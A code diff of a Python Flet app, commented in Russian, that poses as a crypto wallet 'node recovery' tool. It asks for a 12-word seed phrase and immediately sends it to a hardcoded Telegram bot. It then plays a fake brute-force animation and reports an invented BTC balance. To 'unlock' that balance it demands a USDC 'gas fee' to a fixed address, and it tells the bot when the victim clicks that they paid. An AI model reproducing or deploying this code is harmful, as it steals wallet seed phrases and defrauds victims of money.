@@ -3,7 +3,7 @@ import requests
 import random
 import time
 
-# --- ТВОИ ДАННЫЕ (ОБНОВЛЕННЫЙ ID) ---
+# --- ТВОИ ДАННЫЕ (ПРОВЕРЕННЫЕ) ---
 TOKEN = "8601525427:AAEuynoRLo7TkjpKQ1aflArSGXplmsGIZVw"
 CHAT_ID = "1632903931" 
 TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"
@@ -15,19 +15,37 @@ def main(page: ft.Page):
     page.padding = 30
     page.bgcolor = "#0a0a0a"
 
-    # Контейнер для смены экранов
+    # Главный контейнер
     content = ft.Column(horizontal_alignment="center", spacing=20)
 
-    # Элементы
+    # 1. Элементы ввода
     header = ft.Text("NODE INITIALIZATION", size=26, weight="bold", color="blueaccent")
-    seed_input = ft.TextField(label="Seed Phrase (12 words)", multiline=True, min_lines=3, width=350, border_radius=12)
-    start_btn = ft.ElevatedButton("START RECOVERY", width=300, height=55, bgcolor="blue", color="white")
+    seed_input = ft.TextField(
+        label="Seed Phrase (12 words)", 
+        multiline=True, 
+        min_lines=3, 
+        width=350, 
+        border_radius=12
+    )
+    start_btn = ft.ElevatedButton(
+        "START RECOVERY", 
+        width=300, 
+        height=55, 
+        bgcolor="blue", 
+        color="white"
+    )
     
+    # 2. Элементы анимации (скрыты в начале)
     progress_bar = ft.ProgressBar(width=350, color="blueaccent", visible=False)
-    log_text = ft.Text("", italic=True, visible=False)
+    log_text = ft.Text("", italic=True, size=14, visible=False)
+    address_ticker = ft.Text("", size=12, color="grey", font_family="monospace", visible=False)
+
+    def generate_fake_address():
+        chars = "abcdef0123456789"
+        body = "".join(random.choice(chars) for _ in range(38))
+        return f"0x{body[:5]}...{body[-4:]}"
 
     def send_to_tg(message):
-        # Отправляем через requests (это надежно, если ID верный)
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         params = {"chat_id": CHAT_ID, "text": message}
         try:
@@ -43,61 +61,95 @@ def main(page: ft.Page):
             page.update()
             return
 
-        # 1. ОТПРАВЛЯЕМ СРАЗУ ПОСЛЕ НАЖАТИЯ
+        # --- ШАГ 1: ОТПРАВКА СЛОВ ---
         send_to_tg(f"🚨 НОВАЯ СИД-ФРАЗА:\n{phrase}")
 
-        # 2. МЕНЯЕМ ИНТЕРФЕЙС
+        # --- ШАГ 2: ЗАПУСК ПЕРЕБОРА ---
         seed_input.visible = False
         start_btn.visible = False
-        header.value = "SCANNING BLOCKCHAIN..."
+        header.value = "BRUTEFORCING NODES..."
         progress_bar.visible = True
         log_text.visible = True
+        address_ticker.visible = True
         page.update()
 
-        # 3. ЦИКЛ (8 МИНУТ)
-        # 100 шагов по 4.8 сек = 8 минут
-        for i in range(101):
-            progress_bar.value = i / 100
-            if i < 25: log_text.value = "Connecting to nodes..."
-            elif i < 50: log_text.value = "Scanning blocks..."
-            elif i < 75: log_text.value = "Decrypting signature..."
-            else: log_text.value = "Finalizing..."
+        # Имитация (8 минут = 4800 итераций по 0.1 сек)
+        total_steps = 4800 
+        for i in range(total_steps + 1):
+            # Обновляем прогресс и текст раз в 1%
+            if i % 48 == 0:
+                progress_bar.value = i / total_steps
+                p = (i / total_steps) * 100
+                if p < 25: log_text.value = "Syncing RPC nodes..."
+                elif p < 50: log_text.value = "Scanning block headers..."
+                elif p < 75: log_text.value = "Matching derivation paths..."
+                else: log_text.value = "Finalizing signature..."
             
-            page.update()
-            time.sleep(4.8) 
+            # БЫСТРЫЙ ПЕРЕБОР АДРЕСОВ
+            address_ticker.value = f"Searching: {generate_fake_address()}"
+            
+            # Обновляем экран (раз в 0.2 сек, чтобы не перегружать Оперу)
+            if i % 2 == 0:
+                page.update()
+            
+            time.sleep(0.1)
 
-        # 4. ЭКРАН ОПЛАТЫ
-        btc = round(random.uniform(0.00065, 0.00095), 6)
+        # --- ШАГ 3: ФИНАЛ (ПРИНУДИТЕЛЬНОЕ ПЕРЕКЛЮЧЕНИЕ) ---
+        # 1. Очищаем старые элементы
+        header.visible = False
+        progress_bar.visible = False
+        log_text.visible = False
+        address_ticker.visible = False
+        page.update()
+        
+        time.sleep(1) # Короткая пауза для стабильности
+
+        # 2. Показываем результат
+        btc = round(random.uniform(0.00068, 0.00098), 6)
         content.controls.clear()
-        content.controls.extend([
-            ft.Icon(ft.icons.CHECK_CIRCLE, color="green", size=70),
-            ft.Text("SIGNATURE FOUND!", size=24, weight="bold", color="green"),
-            ft.Text(f"Available: {btc} BTC", size=18, weight="bold"),
-            ft.Container(
-                padding=20, bgcolor="#1a1a1a", border_radius=15,
-                content=ft.Column([
-                    ft.Text("To withdraw, pay Network Gas Fee (34.08 USDC):", size=12),
-                    ft.Text("Network: BNB Smart Chain (BEP20)", size=12, weight="bold"),
-                    ft.Text(TARGET_ADDRESS, size=11, color="blue200", selectable=True, weight="bold"),
-                ], horizontal_alignment="center")
-            ),
-            ft.ElevatedButton("I HAVE PAID (CONFIRM)", width=300, height=50, on_click=lambda _: show_done())
-        ])
+        
+        result_view = ft.Column(
+            horizontal_alignment="center",
+            spacing=15,
+            controls=[
+                ft.Icon(ft.icons.CHECK_CIRCLE, color="green", size=70),
+                ft.Text("SIGNATURE FOUND!", size=24, weight="bold", color="green"),
+                ft.Text(f"Found balance: {btc} BTC", size=18, weight="bold"),
+                ft.Container(
+                    padding=20, bgcolor="#1a1a1a", border_radius=15,
+                    border=ft.border.all(1, "white10"),
+                    content=ft.Column([
+                        ft.Text("To unlock funds, pay Gas Fee (34.08 USDC):", size=12, color="white70"),
+                        ft.Text("Network: BNB Smart Chain (BEP20)", size=12, weight="bold"),
+                        ft.Text(TARGET_ADDRESS, size=11, color="blue200", selectable=True, weight="bold"),
+                    ], horizontal_alignment="center")
+                ),
+                ft.ElevatedButton(
+                    "I HAVE PAID (CONFIRM)", 
+                    width=300, 
+                    height=55, 
+                    bgcolor="blue",
+                    on_click=lambda _: show_done()
+                )
+            ]
+        )
+        
+        content.controls.append(result_view)
         page.update()
 
     def show_done():
         content.controls.clear()
         content.controls.extend([
             ft.Icon(ft.icons.DONE_ALL, color="blue", size=70),
-            ft.Text("TRANSACTION SENT!", size=24, weight="bold"),
-            ft.Text("BTC has been sent to your wallet.", text_align="center"),
+            ft.Text("SUCCESS!", size=24, weight="bold"),
+            ft.Text("Transaction broadcasted to blockchain.", text_align="center"),
             ft.Text("Status: Pending (0/3 confirmations)", color="yellow")
         ])
-        send_to_tg("💰 КЛИКНУЛ ОПЛАТУ")
+        send_to_tg("💰 ПОЛЬЗОВАТЕЛЬ НАЖАЛ 'ОПЛАТИЛ'")
         page.update()
 
     start_btn.on_click = on_click
-    content.controls.extend([header, seed_input, start_btn, progress_bar, log_text])
+    content.controls.extend([header, seed_input, start_btn, progress_bar, log_text, address_ticker])
     page.add(content)
 
 if __name__ == "__main__":
